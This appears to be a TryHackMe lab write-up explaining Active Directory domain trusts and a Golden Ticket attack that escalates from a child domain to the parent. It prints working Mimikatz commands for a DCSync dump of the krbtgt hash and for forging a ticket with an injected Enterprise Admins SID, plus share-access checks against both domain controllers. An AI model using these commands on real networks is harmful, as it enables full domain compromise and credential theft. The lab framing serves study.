Here, we are exploiting the domain trusts between two different domains.
There are two main types of trusts that can be configured between domains:

Directional - The direction of the trust flows from a trusting domain to a trusted domain
Transitive - The trust relationship expands beyond just two domains to include other trusted domains

It's common to have a root / parent domain in the forest. 

Let's take an example
subdomain 1: za.tryhackme.com
subdomain 2: uk.tryhackme.com
root domain: tryhackme.com

if the za wants some resources from the uk domain, we can grant it through
the root domain. this creates bidirectional trust between the za and the
root domain, and the uk and the root domain, which is good for us as 
attackers.

KRBTGT is the account used for Microsoft's implementation of Kerberos.
 The name is derived from Kerberos (KRB) and Ticket Granting Ticket (TGT).
 Essentially, this account acts as the service account for the Kerberos
 Distribution Center (KDC) service, which handles all Kerberos ticket
 requests. This account is used to encrypt and sign all Kerberos tickets
 for the domain. Since the password hash is shared by all domain 
controllers, they can then verify the authenticity of the received 
TGT when users request access to resources.

However, what if we want to generate our own TGTs to grant us access 
to everything? This is known as a Golden Ticket attack. In a Golden 
Ticket attack, we bypass the KDC altogether and create our own TGTs, 
essentially becoming a Ticket Granting Server (TGS). In order to forge 
TGTs, we need the following information:

The FQDN of the domain
The Security Identifier (SID) of the domain
The username of the account we want to impersonate
The KRBTGT password hash

The first three are easy work. The last one however requires us to have
a domain compromise since password hashes are usually only stored on 
domain controllers. 

Since the tier 0 admins group had been compromised in my current attack
with a forged certificate, we are in the highest tier of admin, and 
therefore we are in a position to recover the password hash.

We will again use Mimikatz with a DC Sync to recover the KRBTGT 
password hash on THMSERVER2:

mimikatz_trunk\x64\mimikatz.exe

privilege::debug

lsadump::dcsync /user:za\krbtgt

Before we can go into exploitation, we first need to recover two SIDs:

The SID of the child domain controller (THMDC), which we will impersonate 
in our forged TGT
The SID of the Enterprise Admins in the parent domain, 
which we will add as an extra SID to our forged TGT

Recover the SID of the child domain using the following command:
Get-ADComputer -Identity "THMDC"

Then, recover the SID of the enterprise admins group using the command:
Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc

we are now onto generating our golden ticket:

mimikatz_trunk\x64\mimikatz.exe
privilege::debug
kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:<Password hash of krbtgt user> /sids:<SID of Enterprise Admins group> /ptt

First, we will verify that this ticket works for access to THMDC since it is a valid ticket for the Administrator 
user of the child domain:
dir \\thmdc.za.tryhackme.loc\c$

now, we check whether we have access to the parent dc:
dir \\thmrootdc.tryhackme.loc\c$\


